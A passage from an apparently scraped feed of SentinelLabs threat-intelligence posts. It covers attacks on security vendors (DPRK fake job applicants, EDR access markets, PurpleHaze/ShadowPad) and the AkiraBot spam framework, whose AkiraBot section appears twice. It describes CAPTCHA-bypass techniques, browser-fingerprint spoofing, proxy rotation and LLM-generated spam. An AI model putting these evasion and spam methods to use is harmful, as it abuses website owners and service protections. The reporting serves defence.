operating as a cybersecurity company in today’s landscape. We don’t just study attacks, we experience them firsthand, levied against us. Our teams face the same threats we help others prepare for, and that proximity to the front lines shapes how we think, and how we operate. Real-world attacks against our own environment serve as constant pressure tests, reinforcing what works, revealing what doesn’t, and driving continuous improvement across our products and operations. When you’re a high-value target for some of the most capable and persistent adversaries out there, nothing less will do.\nTalking about being targeted is uncomfortable for any organization. For cybersecurity vendors, it’s practically taboo. But the truth is security vendors sit at an interesting cross-section of access, responsibility, and attacker ire that makes us prime targets for a variety of threat actors, and the stakes couldn’t be higher. When adversaries compromise a security company, they don’t just breach a single environment—they potentially gain insight into how thousands of environments and millions of endpoints are protected.\nIn the past several months alone, we’ve observed and defended against a spectrum of attacks ranging from financially motivated crimeware to tailored campaigns by advanced nation-state actors. They were real intrusion attempts targeting a U.S.-based cybersecurity company — launched by adversaries actively looking for an advantage, access, or leverage. Adversaries included DPRK IT workers posing as job applicants, ransomware operators probing for ways to access/abuse our platform, and Chinese state-sponsored actors targeting organizations aligned with our business and customer base.\nWe are certainly not the only ones facing these threats. In the spirit of furthering collective defenses and encouraging further collaboration, we’re pulling back the curtain to share some of what we’ve seen, why it matters, and what it tells us about the evolving threat landscape—not just for us, but for every company building and relying on modern security technology.\nDPRK IT Workers Seeking Inside Jobs\nOne of the more prolific and persistent adversary campaigns we’ve tracked in recent years involves widespread campaigns by DPRK-affiliated IT Workers attempting to secure remote employment within Western tech companies– including SentinelOne. Early reports drew attention to these efforts and our own analysis revealed further logistical infrastructure to launder illicit funds via Chinese intermediary organizations. However, neither gave a sense of the staggering volume of ongoing infiltration attempts. This vector far outpaces any other insider threat vector we monitor.\nThese actors are not just applying blindly — they are refining their process, leveraging stolen or fabricated personas, and adapting their outreach tactics to mirror legitimate job seekers in increasingly convincing ways. Our team has tracked roughly 360 fake personas and over 1,000 job applications linked to DPRK IT worker operations applying for roles at SentinelOne — even including brazen attempts to secure positions on the SentinelLabs intelligence engineering team itself.\nPublic reporting of DPRK IT workers applying to threat intelligence positions\nEngagement and Adversary Interaction\nInstead of staying passive, we made a deliberate choice towards intelligence-driven engagement. In coordination with our talent acquisition teams, we developed workflows to identify and interact with suspected DPRK applicants during the early phases of their outreach. This collaboration was key. By embedding lightweight vetting signals and monitoring directly into recruiting processes — without overburdening hiring teams — we were able to surface anomalous patterns tied to DPRK-affiliated personas piped directly into our Vertex Synapse intelligence platform for analyst review.\nOur attempted interactions offered rare insights into the craftiness and persistence of these infiltration campaigns — particularly the ways in which adversaries adapt to the friction they encounter.\nInbound DPRK referral request to strategic employees\nThe attackers are honing their craft beyond the job application and recruitment process. An operation of this scale and nature requires a different kind of backend infrastructure, such as a sprawling network of front companies to enable further laundering and logistics.\nDPRK IT Worker Front Company Network (November 2024)\nHelping Hiring Teams Help Us\nA key takeaway in working on this investigation was the value of intentionally creating inroads and sharing threat context with different teams not normally keyed into investigations. Rather than cluelessness, we encountered an intuitive understanding of the situation as recruiters had already been filtering out and reporting ‘fake applicants’ within their own processes.\nWe brought campaign-level understanding that was combined with tactical insights from our talent team. The payoff was immediate. Recruiters began spotting patterns on their own, driving an increase in early-stage escalation of suspicious profiles. They became an active partner that continues to flag new sightings from the frontlines. In turn, we are codifying these insights into automated systems that flag, filter, enrich, and proactively block these campaigns to lower the burden on our recruiters and hiring managers, and reduce the risk of infiltration.\nMake cross‑functional collaboration standard operating procedure: equip frontline business units—from recruiting to sales—with shared threat context and clear escalation paths so they can surface anomalies early without slowing the business. Codifying insights with automation will consistently bring bi-directional benefits.\nThe DPRK IT worker threat is a uniquely complex challenge — one where meaningful progress depends on collaboration between the security research community and public sector partners.\nRansomware Group Capability Development\nFinancially motivated threat actors frequently target enterprise security platforms —products designed to keep them from making money—for direct access. SentinelOne, like our peers, is no exception. While uncomfortable, this is a reality the industry faces continually and should handle with both transparency and urgency.\nForum post offering security product access\nPrivileged access to administrative interfaces or agent installers for endpoint security products provides tangible advantages for adversaries seeking to advance their operations. Console access can be used to disable protections, manipulate configurations, or suppress detections. Direct, unmonitored access to the endpoint agent offers opportunities to test malware efficacy, explore bypass or tampering techniques, and suppress forensic visibility critical for investigations. In the wrong hands, these capabilities represent a significant threat to both the integrity of security products and the environments they protect.\nThis isn’t a new tactic. Various high-profile criminal groups have long specialized in social engineering campaigns to gain access to core security tools and infrastructure—ranging from EDR platforms (including SentinelOne and Microsoft Defender) to IAM and VPN providers such as Okta. Their goal: expand footholds, disable defenses, and obstruct detection long enough to profit.\nRecent leaks related to Black Basta further underscore this trend. The group’s operators were observed testing across multiple endpoint security platforms—including SentinelOne, CrowdStrike, Carbon Black, and Palo Alto Networks—before launching attacks, suggesting a systematic effort to evaluate and evade security tools prior to deployment.\nBlack Basta leak excerpts\nEconomy/Ecosystem\nThere is an increasingly mature and active underground economy built around the buying, selling, and renting of access to enterprise security tools. For the right price, aspiring threat actors continually attempt to obtain time-bound or persistent access to our EDR platform and administrative consoles. Well-known cybercrime forums are filled with vendors openly advertising such access—and just as many buyers actively seeking it. This includes long-established forums like XSS[.]is, Exploit[.]in and RAMP.\nThat said, more of this activity has been moving to confidential messaging platforms as well (Telegram, Discord, Signal). For example, Telegram bots are used to automate trading this access, and Signal is often used by threat actors to discuss nuance, targeting and initial access operations.\nThis supply-and-demand dynamic is not only robust but also accelerating. Entire service offerings have emerged around this ecosystem, including “EDR Testing-as-a-Service,” where actors can discreetly evaluate malware against various endpoint protection platforms.\nProposed Private EDR testing service\nWhile these testing services may not grant direct access to full-featured EDR consoles or agents, they do provide attackers with semi-private environments to fine-tune malicious payloads without the threat of exposure—dramatically improving the odds of success in real-world attacks.\nProspective buyer for EDR installs\nAccess isn’t always bought, however. Threat actors frequently harvest legitimate credentials from infostealer logs—a common and low-cost method of acquiring privileged access to enterprise environments. In cases where existing customers reuse credentials, this can translate into a threat actor also gaining access to security tools. In more targeted operations, actors have also turned to bribery, offering significant sums to employees willing to sell out their account access.\nThese insider threats are not hypothetical. For instance, some groups have been observed offering upwards of $20,000 to employees at targeted companies in exchange for insider assistance—an approach openly discussed in the same dark web forums where compromised credentials and access are routinely traded.\nOn the defensive side, this requires constant monitoring and maintenance. Situational awareness has to be prioritized in order to maintain platform integrity and protect our legitimate customers. Our research teams are constantly monitoring for this style of abuse and access ‘leakage’, focusing on anomalous console access and site-token usage, and taking necessary actions to revoke these access vectors. This prohibits threat actors from fully interacting with the wider platform, and essentially orphans leaked agent installs, limiting the use of the agent in the hands of the threat actor.\nNitrogen — Threat Operators ‘Leveling Up’\n\nSome ransomware operations are now bypassing the underground market altogether—opting instead for more tailored, concentrated-effort impersonation campaigns to gain access to security tools. This approach is epitomized by the Nitrogen ransomware group.\nNitrogen is believed to be operated by a well-funded Russian national with ties to earlier groups like Maze and Snatch. Rather than purchasing illicit access, Nitrogen impersonates real companies—spinning up lookalike domains, spoofed email addresses, and cloned infrastructure to convincingly pose as legitimate businesses. Nitrogen then purchases official licenses for EDR and other security products under these false pretenses.\nThis kind of social engineering is executed with precision. Nitrogen typically targets small, lightly vetted resellers—keeping interactions minimal and relying on resellers’ inconsistent KYC (Know Your Customer) practices to slip through the cracks.\nThese impersonation tactics introduce a new layer of complexity for defenders. If a threat actor successfully acquires legitimate licenses from a real vendor, they can weaponize the product to test, evade, and potentially disable protections—without ever having to engage with criminal markets.\nThis highlights a growing challenge for the security industry: reseller diligence and KYC enforcement are clearly part of the threat surface. When those controls are weak or absent, adversaries like Nitrogen gain powerful new ways to elevate their campaigns—often at a lower cost and lower risk than the black market.\nLessons Learned and Internal Collaboration\nOne of the most impactful lessons from tracking adversaries targeting our platform has been the value of deep, early collaboration across internal teams — particularly those not traditionally pulled into threat response efforts. For example, by proactively engaging with our reseller operations and customer success teams, we can surface valuable signals on questionable license requests, reseller behavior anomalies, and business inconsistencies that could have otherwise gone unnoticed.\nBy creating shared playbooks, embedding lightweight threat context, and establishing clear escalation paths, reactive processes turn into proactive signal sources.

Making cross-functional threat awareness standard operating procedure and integrating detection logic at the edge of business systems is essential.\nWe’re continuing to improve this work in quiet ways.

We first became aware of this threat cluster during a 2024 intrusion conducted against an organization previously providing hardware logistics services for SentinelOne employees. We refer to this cluster of activity as PurpleHaze, with technical overlaps to multiple publicly reported Chinese APTs.\nThe PurpleHaze Activity Cluster\nOver the course of months, SentinelLABS observed the threat actor conduct many intrusions, including into a South Asian government supporting entity, providing IT solutions and infrastructure across multiple sectors. This activity involved extensive infrastructure, some of which we associate with an operational relay box (ORB) network, and a Windows backdoor that we track as GoReShell. The backdoor is implemented in the Go programming language and uses functionalities from the open-source reverse_ssh tool to establish reverse SSH connections to attacker-controlled endpoints.\nSentinelLABS collectively tracks these activities under the PurpleHaze moniker. We assess with high confidence that PurpleHaze is a China-nexus actor, loosely linking it to APT15 (also known as Nylon Typhoon, or other various outdated aliases). This adversary is known for its global targeting of critical infrastructure sectors, such as telecommunications, information technology, and government organizations – victimology that aligns with our multiple encounters with PurpleHaze.\nWe track the ORB network infrastructure observed in the attack against the South Asian government organization as being operated from China and actively used by several suspected Chinese cyberespionage actors, including APT15. The use of ORB networks is a growing trend among these threat groups, since they can be rapidly expanded to create a dynamic and evolving infrastructure that makes tracking cyberespionage operations and their attribution challenging. Additionally, GoReShell malware and its variations, including the deployment mechanism on compromised machines and obfuscation techniques have been exclusively observed in intrusions that we attribute with high confidence to China-nexus actors.\nShadowPad Intrusions\nIn June 2024, approximately four months prior to PurpleHaze targeting SentinelOne, SentinelLABS observed threat actor activity targeting the same South Asian government entity that was also targeted in October 2024. Among the retrieved artifacts, we identified samples of ShadowPad, a modular backdoor platform used by multiple suspected China-nexus threat actors to conduct cyberespionage. Recent ShadowPad activity has also included the deployment of ransomware, though the motive remains unclear — whether for financial gain or as a means of distraction, misattribution, or removal of evidence.\nThe ShadowPad samples we retrieved were obfuscated using ScatterBrain, an evolution of the ScatterBee obfuscation mechanism. Our industry partner, Google Threat Intelligence Group (GTIG), have also observed the use of ScatterBrain-obfuscated ShadowPad samples since 2022 and attribute them to clusters associated with the suspected Chinese APT actor, APT41.\nGTIG APT41 Use of ScatterBrain\nInvestigations continue in determining the specific actor overlap between June 2024 ShadowPad intrusions and the later PurpleHaze activity. We do not rule out the involvement of the same threat cluster, particularly given the extensive sharing of malware, infrastructure, and operational practices among Chinese threat groups, as well as the possibility of access transfer between different actors.\nBased on private telemetry, we identified a large collection of victim organizations compromised using ScatterBrain-obfuscated ShadowPad. Between July 2024 and March 2025, this malware was used in intrusions at over 70 organizations across various regions globally, spanning sectors such as manufacturing, government, finance, telecommunications, and research. We assess that the threat actor primarily gained initial foothold in the majority of these organizations by exploiting an n-day vulnerability in CheckPoint gateway devices, which aligns with previous research on ShadowPad intrusions involving the deployment of ransomware.\nAmong the victims, we identified the previously mentioned IT services and logistics organization that was at the time responsible for managing hardware logistics for SentinelOne employees. Victim organizations were promptly informed of intrusion specifics, which were swiftly investigated. At this point, it remains unclear whether the perpetrators’ focus was solely on the compromised organization or if they intended to extend their reach to client organizations as well.\nA detailed investigation into SentinelOne’s infrastructure, software, and hardware assets found no evidence of secondary compromise. Nevertheless, this case underscores the fragility of the larger supplier ecosystem that organizations depend upon and the persistent threat posed by suspected Chinese threat actors, who continuously seek to establish strategic footholds to potentially compromise downstream entities.\nSentinelLABS will share a detailed public release on this topic in due course, providing further technical information on these activities, including observed TTPs, malware, and infrastructure.\nLessons Learned While Hardening Our Operational Ecosystem\nOur analysis of the PurpleHaze cluster, and more specifically the potential indirect risk introduced via compromised third-party service providers, has reinforced several key insights around operational security and supply chain monitoring. Even when our own infrastructure remained untouched, the targeting of an external service provider previously associated with business logistics surfaced important considerations.\nOne immediate reminder is the necessity of maintaining real-time awareness not only over internal assets but also over adjacent service providers—particularly those with past or current access to sensitive employee devices or logistical information. When incidents occur near your supply chain, don’t wait for confirmation of compromise. Proactively trigger internal reviews of asset inventories, procurement workflows, OS images and onboarding deployment scripts, and segmentation policies to quickly identify any exposure pathways and reduce downstream risk.\nThis leads to several defense recommendations:\nDistribute Threat Intelligence Across Operational Stakeholders\nIntegrate Threat Context Into Asset Attribution Workflows\nExpand Supply Chain Threat Modeling\nWhile attribution continues to evolve and victim impact remains diverse, one thing is clear: well-resourced threat actors are increasingly leaning on indirect routes into enterprise environments. Investigations like this help us sharpen our defenses—not just around traditional digital perimeters but around the full operational footprint of our organization.\nThe Strategic Value of Cyber Threat Intelligence\nIn today’s threat landscape, threat intelligence has evolved from a niche function into an essential pillar of enterprise defense—particularly for private sector organizations operating in the security space. As threat actors increasingly target security vendors for insider access, abuse of legitimate channels, and supply chain infiltration, the role of CTI in anticipating and disrupting these tactics has become more critical than ever.\nOne of the most tangible examples of this value is in internal talent acquisition and insider threat defense. Intelligence has become a frontline asset in identifying attempts by North Korean IT workers and other state-backed operatives to embed themselves in organizations under false pretenses. By flagging suspicious applicant patterns, cross-referencing alias histories, and tracking known tradecraft, CTI teams help hiring managers and HR avoid potential insider incidents before they start.\nOur CTI capabilities must also directly support sales and channel operations. As criminal groups increasingly impersonate legitimate businesses to acquire security products through trusted resellers, intelligence plays a key role in verifying customer legitimacy and identifying anomalous purchase behaviors. By integrating intelligence insights into pre-sale vetting workflows, a crucial layer of protection is helping to ensure adversaries cannot simply “buy” their way into our technology stack.\nInternally, threat intelligence informs and enhances how we defend our own technology and supply chain against highly targeted APT activity. From understanding how adversaries reverse-engineer our software to uncovering which parts of our technology stack they seek to compromise, CTI enables proactive hardening, smarter telemetry prioritization, and meaningful collaboration with product and engineering teams. In essence, intelligence acts as an early-warning system and a strategic guide—ensuring our defenses stay one step ahead of evolving threats.\nAcross every function—whether it’s HR, Sales, Engineering, or Security—cyber threat intelligence is no longer a backroom function. It’s embedded in the fabric of how we defend, operate, and grow as a business.","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2025/04/TopTier_soc_ftr.jpg","length":"224159","type":"image/jpeg"},"dc:creator":"Tom Hegel, Aleksandar Milenkoski &amp; Jim Walter","content":"This report highlights a rarely-discussed but crucially important attack surface: security vendors themselves","contentSnippet":"This report highlights a rarely-discussed but crucially important attack surface: security vendors themselves","guid":"https://www.sentinelone.com/?post_type=labs&p=119693","categories":["adversary"],"isoDate":"2025-04-28T09:55:19.000Z","tag":"intel"},{"creator":"Alex Delamotte &amp; Jim Walter","title":"AkiraBot | AI-Powered Bot Bypasses CAPTCHAs, Spams Websites At Scale","link":"https://www.sentinelone.com/labs/akirabot-ai-powered-bot-bypasses-captchas-spams-websites-at-scale/","pubDate":"Wed, 09 Apr 2025 15:00:36 +0000","content:encoded":"<h2>Executive Summary</h2>\n<ul>\n<li aria-level=\"1\">AkiraBot is a framework used to spam website chats and contact forms <em>en masse</em> to promote a low-quality SEO service.</li>\n<li aria-level=\"1\">SentinelLABS assesses that AkiraBot has targeted more than 400,000 websites and successfully spammed at least 80,000 websites since September 2024.</li>\n<li aria-level=\"1\">The bot uses OpenAI to generate custom outreach messages based on the purpose of the website.</li>\n<li aria-level=\"1\">The framework is modular and sophisticated compared to typical spam tools, employing multiple CAPTCHA bypass mechanisms &amp; network detection evasion techniques.</li>\n</ul>\n<h2>Overview</h2>\n<p>Whenever a new form of digital communications becomes prevalent, actors inevitably adopt it for spam to try to profit from unsuspecting users. Email has been the perennial choice for spam delivery, but the prevalence of new communications platforms has expanded the spam attack surface considerably.</p>\n<p>This report explores AkiraBot, a Python framework that targets small to medium sized business website contact forms and chat widgets. AkiraBot is designed to post AI-generated spam messages tailored to the targeted website’s content that shill the services for a dubious Search Engine Optimization (SEO) network. The use of LLM-generated content likely helps these messages bypass spam filters, as the spam content is different each time a message is generated. The framework also rotates which attacker-controlled domain is supplied in the messages, further complicating spam filtering efforts.</p>\n<p>The bot creator has invested significant effort into evading CAPTCHA filters as well as avoiding network detections by relying on a proxy service generally marketed towards advertisers–though the service has had considerable interest and use by cybercriminal actors.</p>\n<p>AkiraBot is not related to the ransomware group Akira; this name was chosen due to the bot’s consistent use of domains that use “Akira” as the SEO service brand.</p>\n<h2>Script Execution and Website Feature Targeting</h2>\n<p>SentinelLABS identified several archives containing scripts related to this framework with file timestamps dating back to September 2024. The oldest archive refers to the bot as Shopbot, likely a reference to its targeting of websites using Shopify. As the tool evolved, the targeting expanded to include websites built using GoDaddy and Wix, as well as generic website contact forms, which includes websites built using Squarespace, and likely other technologies. These technologies are primarily used by small- to medium-sized businesses for their ease in enabling website development with integrations for eCommerce, website content management, and business service offerings.</p>\n<p>There are many versions of this tool with file timestamps in the archives indicating activity between September 2024 to present. Each version uses one of two hardcoded OpenAI API keys and the same proxy credentials and test sites, which links the archives despite the disparate naming conventions. We identified AkiraBot-related archives that had the following root directory names:</p>\n<ul>\n<li aria-level=\"1\">bubble_working_clone</li>\n<li aria-level=\"1\">fingerprints-server</li>\n<li aria-level=\"1\">GoDaddy</li>\n<li aria-level=\"1\">NextCaptcha and FastCaptcha</li>\n<li aria-level=\"1\">NextCaptchaBot-v6</li>\n<li aria-level=\"1\">override</li>\n<li aria-level=\"1\">petar_bot</li>\n<li aria-level=\"1\">shopbotpyv2</li>\n<li aria-level=\"1\">SHOPIFY_SYSTEM_UPDATED</li>\n<li aria-level=\"1\">updatedpybot</li>\n<li aria-level=\"1\">wix</li>\n<li aria-level=\"1\">wixbot</li>\n<li aria-level=\"1\">WORKING_FOLDER</li>\n</ul>\n<p>Additionally, logs from the tool reveal that the operator ran it from the following paths, suggesting that they are most likely using Windows Server systems based on the Administrator username being the most prevalent:</p>\n<pre>\r\n \tC:/Users/Administrator/Desktop/\r\n \tC:/Users/Administrator/Downloads/\r\n \tC:/Users/Usuario/Desktop/ - only appears in the archive named GoDaddy\r\n</pre>\n<p>Originally, AkiraBot spammed website contact forms enticing the site owner to purchase SEO services. Newer versions of AkiraBot have also targeted the Live Chat widgets integrated into many websites, including Reamaze widgets.</p>\n<figure id=\"attachment_117818\" aria-describedby=\"caption-attachment-117818\" style=\"width: 929px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6.jpg\" alt=\"_submit_old_website function in v14.py\" width=\"929\" height=\"363\" class=\"size-full wp-image-117818\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6.jpg 929w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6-300x117.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6-768x300.jpg 768w\" sizes=\"auto, (max-width: 929px) 100vw, 929px\" /><figcaption id=\"caption-attachment-117818\" class=\"wp-caption-text\"><em>_submit_old_website</em> function in <em>v14.py</em></figcaption></figure>\n<p>The bot has a GUI that shows success metrics and lets the operator choose a target list to run against.

The script also logs failed attempts in <code>failed.txt</code> and <code>failed_old.txt</code>. The January 2025 archives showed that only 11,000 domains had failed, including previous runs of the tool. We analyzed all <code>submissions.csv</code> files; deduplicating the results revealed that more than 420,000 unique domains were targeted in total.</p>\n<p>Two versions of AkiraBot used a Telegram bot for logging success metrics.

We expect this campaign to continue to evolve as website hosting providers adapt defenses to deter spam. The author or authors have invested significant effort in this bot’s ability to bypass commonly used CAPTCHA technologies, which demonstrates that the operators are motivated to violate service provider protections.</p>\n<p>AkiraBot’s use of LLM-generated spam message content demonstrates the emerging challenges that AI poses to defending websites against spam attacks. The easiest indicators to block are the rotating set of domains used to sell the Akira and ServiceWrap SEO offerings, as there is no longer a consistent approach in the spam message contents as there were with previous campaigns selling the services of these firms.</p>\n<p>SentinelLABS thanks the OpenAI security team for their collaboration and continued efforts in deterring bad actors from abusing their services. The OpenAI team shared the following response following their investigation:</p>\n<p><em>“We&#8217;re grateful to SentinelOne for sharing their research. Distributing output from our services for spam is against our policies. The API key involved is disabled, and we’re continuing to investigate and will disable any associated assets.

Email has been the perennial choice for spam delivery, but the prevalence of new communications platforms has expanded the spam attack surface considerably.\nThis report explores AkiraBot, a Python framework that targets small to medium sized business website contact forms and chat widgets. AkiraBot is designed to post AI-generated spam messages tailored to the targeted website’s content that shill the services for a dubious Search Engine Optimization (SEO) network. The use of LLM-generated content likely helps these messages bypass spam filters, as the spam content is different each time a message is generated. The framework also rotates which attacker-controlled domain is supplied in the messages, further complicating spam filtering efforts.\nThe bot creator has invested significant effort into evading CAPTCHA filters as well as avoiding network detections by relying on a proxy service generally marketed towards advertisers–though the service has had considerable interest and use by cybercriminal actors.\nAkiraBot is not related to the ransomware group Akira; this name was chosen due to the bot’s consistent use of domains that use “Akira” as the SEO service brand.\nScript Execution and Website Feature Targeting\nSentinelLABS identified several archives containing scripts related to this framework with file timestamps dating back to September 2024. The oldest archive refers to the bot as Shopbot, likely a reference to its targeting of websites using Shopify. As the tool evolved, the targeting expanded to include websites built using GoDaddy and Wix, as well as generic website contact forms, which includes websites built using Squarespace, and likely other technologies. These technologies are primarily used by small- to medium-sized businesses for their ease in enabling website development with integrations for eCommerce, website content management, and business service offerings.\nThere are many versions of this tool with file timestamps in the archives indicating activity between September 2024 to present. Each version uses one of two hardcoded OpenAI API keys and the same proxy credentials and test sites, which links the archives despite the disparate naming conventions. We identified AkiraBot-related archives that had the following root directory names:\nbubble_working_clone\nfingerprints-server\nGoDaddy\nNextCaptcha and FastCaptcha\nNextCaptchaBot-v6\noverride\npetar_bot\nshopbotpyv2\nSHOPIFY_SYSTEM_UPDATED\nupdatedpybot\nwix\nwixbot\nWORKING_FOLDER\nAdditionally, logs from the tool reveal that the operator ran it from the following paths, suggesting that they are most likely using Windows Server systems based on the Administrator username being the most prevalent:\n\r\n \tC:/Users/Administrator/Desktop/\r\n \tC:/Users/Administrator/Downloads/\r\n \tC:/Users/Usuario/Desktop/ - only appears in the archive named GoDaddy\r\n\nOriginally, AkiraBot spammed website contact forms enticing the site owner to purchase SEO services. Newer versions of AkiraBot have also targeted the Live Chat widgets integrated into many websites, including Reamaze widgets.\n_submit_old_website function in v14.py\nThe bot has a GUI that shows success metrics and lets the operator choose a target list to run against. The GUI lets the operator customize how many threads are running at once, a feature the bot uses to target many sites concurrently.\nAkiraBot GUI\nSpam Message Generation\nSearching for websites referencing AkiraBot domains shows that the bot previously spammed websites in a way that the message was indexed by search engines.\nGoogle search results containing useakira[.]com\nSpam comment on website from 2023 and content from AkiraBot templates.txt file\nAkiraBot creates custom spam messages for targeted websites by processing a template that contains a generic outline of the type of message the bot should send.\nSpam message template\nThe template is processed by a prompt sent to the OpenAI chat API to generate a customized outreach message based on the contents of the website. The OpenAI client uses model gpt-4o-mini and is assigned the role “You are a helpful assistant that generates marketing messages.” and the prompt instructs the LLM to replace the variables <WEBSITE_NAME> and <KEYWORD> with the site name provided at runtime.\nAI Chat prompt from v10.py\nThe <KEYWORD> is generated by processing the {context} variable, which contains text scraped from the targeted website via BeautifulSoup, a library that transforms raw HTML code into human–or LLM–readable text.\nAkiraBot’s generate_message function\nThe resulting message includes a brief description of the targeted website, making the message seem curated. The benefit of generating each message using an LLM is that the message content is unique and filtering against spam becomes more difficult compared to using a consistent message template which can trivially be filtered.\nLogged AI-generated outreach messages in submissions.csv\nCAPTCHA Bypass & Network Evasion Techniques\nCAPTCHA Bypass\nAkiraBot puts significant emphasis on evading CAPTCHAs so that it can spam websites at scale. The targeted CAPTCHA services include hCAPTCHA and reCAPTCHA, including Cloudflare’s hCAPTCHA service in certain versions of the tool.\nWe identified an archive with files for CAPTCHA-related servers and browser fingerprints, which allow the bot’s web traffic to mimic a legitimate end user. The archives contain a fingerprint server that runs on the same system as the other AkiraBot tools and intercepts the website loading processes using Selenium WebDriver, an automation framework that simulates user browsing activity.\nThe inject.js script injects code into the targeted website’s Document Object Model (DOM) which enables the tool to modify how the website loads in real time and change behaviors. inject.js manipulates values in the session via a headless Chrome instance that makes the session appear like an end user’s browser to the webserver. The script modifies multiple browser attributes that webservers use to identify the nature of the browser viewing the website, including:\nAudio Context and Voice engines, which are used to profile whether a session is headless or a real browser\nGraphics rendering, including canvas and WebGL attributes\nInstalled fonts\nNavigator objects, which provide a wealth of profiling information, such as browser type, operating system & architecture, geolocation, hardware details, languages installed, and browser privacy settings\nSystem memory, storage, and CPU profile\nTimezone\nThe bot uses several CAPTCHA bypassing services, including Capsolver, FastCaptcha, and NextCaptcha, which are failover services for when browser emulation is insufficient to interact with the targeted website.\nFastCaptcha token generator function in v10.py\nAkiraBot also runs a headless Chrome instance to refresh values for Reamaze tokens periodically. Reamaze provides websites with customer support chat integrations, making this another targeted feature. The service also offers spam filters for chats on its platform, indicating that this is a known vector for spam attacks.\nReamaze token handling function\nNetwork Evasion Techniques\nAkiraBot uses many different proxy hosts to evade network detections and diversify the source of where its traffic comes from. In each archive SentinelLABS analyzed, AkiraBot used the SmartProxy service. SmartProxy’s website claims that its proxies are ethically sourced and that they provide data center, mobile, and residential proxies. Each version of the bot uses the same proxy credentials, suggesting the same actor is behind each iteration.\nget_random_proxy function in The_NextCaptcha_Bot.py\nWhile SmartProxy is a service that seems to operate within legal boundaries, it is worth noting that it has regularly had the attention of cybercriminals. The BlackBasta ransomware leaks referenced an exchange of SmartProxy credentials, for example.\nSmartProxy credentials from BlackBasta leaks\nLogging & Success\nAkiraBot logs its spam progress to submissions.csv, which sometimes includes the AI-generated spam message contents as well. The submissions.csv file from the January 2025 archives show more than 80,000 unique domains that were successfully spammed. The script also logs failed attempts in failed.txt and failed_old.txt. The January 2025 archives showed that only 11,000 domains had failed, including previous runs of the tool. We analyzed all submissions.csv files; deduplicating the results revealed that more than 420,000 unique domains were targeted in total.\nTwo versions of AkiraBot used a Telegram bot for logging success metrics. The scripts monitor.py and monitor_random.py would collect success metrics from the bot and post them to a Telegram channel via API.\nTelegram sending functionality in monitor.py\nTelegram Detail\nThe Telegram functionality, contained in the monitor.py and monitor_random.py scripts, is tied into proxy rotation and CAPTCHA defeat features contained within the bundled JavaScript file script.js.  The monitor.py script utilizes pyautogui to paste the contents of script.js into a browser developer console by scripting CTRL+SHIFT+J, followed by the paste command, eventually executing the JavaScript within the browser console.\npyautogui actions in monitor.py\nThe pasted and executed JavaScript is then responsible for attempting CAPTCHA refreshes and defeats on targeted URLs, reporting the status returned to a JSON file, stats.json. If a proxy rotation is required, to aid further in refreshing the CAPTCHA defeat attempts on a given URL, the monitor.py script handles this as well, rotating the used proxy though the iproxyonline service (fxdx[.]in).\nProxy rotation is generally enabled to avoid geographic or IP-based restrictions when repeatedly attempting to refresh and defeat CAPTCHAs. The Telegram status updates specifically report on proxy rotations and CAPTCHA submissions. Some versions of these scripts have the proxy rotation section commented out, indicating that it is an optional feature.\nTelegram message submission + proxy rotation status in monitor.py\nAll of the analyzed monitor.py and monitor_random.py scripts contain the same Telegram token and chat_id combination.\nTelegram bot data in monitor.py\nThis Telegram chat_id is associated with the following Telegram user data:\n\r\n(bot) username: htscasdasdadwoobot\r\nFirstname: Shadow / hts\r\nLastName: a_zarkawi\r\n\nHTS Telegram bot referenced in monitor.py scripts\nInfrastructure\nThe spam messages frequently rotate the domain used, likely in an attempt to avoid detection. The oldest domain in use is akirateam[.]com, which was registered in January 2022 on a Germany-based IP, 91.195.240[.]94, without further updates until March 2023. The second oldest domain is goservicewrap[.]com, which was registered in April 2024 and resolved to 86.38.202[.]110, a Hostinger IP in Cyprus.\nSeveral AkiraBot domains have interesting connections through historical DNS activity. The subdomain mail.servicewrap-go[.]com briefly shared a CNAME record pointing to 77980.bodis[.]com, which is associated with various malicious activities, including a 2023 malvertising campaign. This domain also received communications from several Windows executable files that were detected as various banking trojans.\nAn odd relationship stood out in anchor links referencing 77980.bodis[.]com: the website unj[.]digital contained anchor links from December 2024 through February 2025 pointing to 77980.bodis[.]com. UNJ Digital’s website describes itself as a digital marketing and software development firm. The subdomain smtp.unj[.]digital also has a CNAME record pointing to 77980.bodis[.]com, fortifying a connection between these hosts. While the website now highlights offering digital content services, as of late 2024 the site showed a focus on increasing marketing revenue.\nScreenshot of content on unj[.]digital circa October 2024\nScreenshot of content on unj[.]digital circa March 2025\nAkira and ServiceWrap SEO\nAkiraBot uses two distinct themes in their SEO offering domain naming conventions: Akira and ServiceWrap. Reviews for both services on TrustPilot are similar: many 5-star reviews with similar, potentially AI-generated contents, and the occasional 1-star review complaining that the site is either a scam or has spammed the person leaving the review.\nThe 5-star reviews tend to follow a pattern where the reviewer has one previous review that was made 1-5 days before the Akira or ServiceWrap review. The review themes are very similar across these 5-star reviews, though the contents and structure are always unique. We believe the actor may be generating some fake reviews, though it is difficult to say with certainty.\nTrustpilot review for servicewrapgo[.]com\nTrustpilot review for useakira[.]com\nTrustpilot review for useakira[.]com\nConclusion\nAkiraBot is a sprawling framework that has undergone multiple iterations to integrate new spamming target technologies and evade website defenses. We expect this campaign to continue to evolve as website hosting providers adapt defenses to deter spam. The author or authors have invested significant effort in this bot’s ability to bypass commonly used CAPTCHA technologies, which demonstrates that the operators are motivated to violate service provider protections.\nAkiraBot’s use of LLM-generated spam message content demonstrates the emerging challenges that AI poses to defending websites against spam attacks. The easiest indicators to block are the rotating set of domains used to sell the Akira and ServiceWrap SEO offerings, as there is no longer a consistent approach in the spam message contents as there were with previous campaigns selling the services of these firms.\nSentinelLABS thanks the OpenAI security team for their collaboration and continued efforts in deterring bad actors from abusing their services. The OpenAI team shared the following response following their investigation:\n“We’re grateful to SentinelOne for sharing their research. Distributing output from our services for spam is against our policies. The API key involved is disabled, and we’re continuing to investigate and will disable any associated assets. We take misuse seriously and are continually improving our systems to detect abuse.”\nIndicators of Compromise\nAkira & ServiceWrap Domains\nAkiraBot Tool Archive 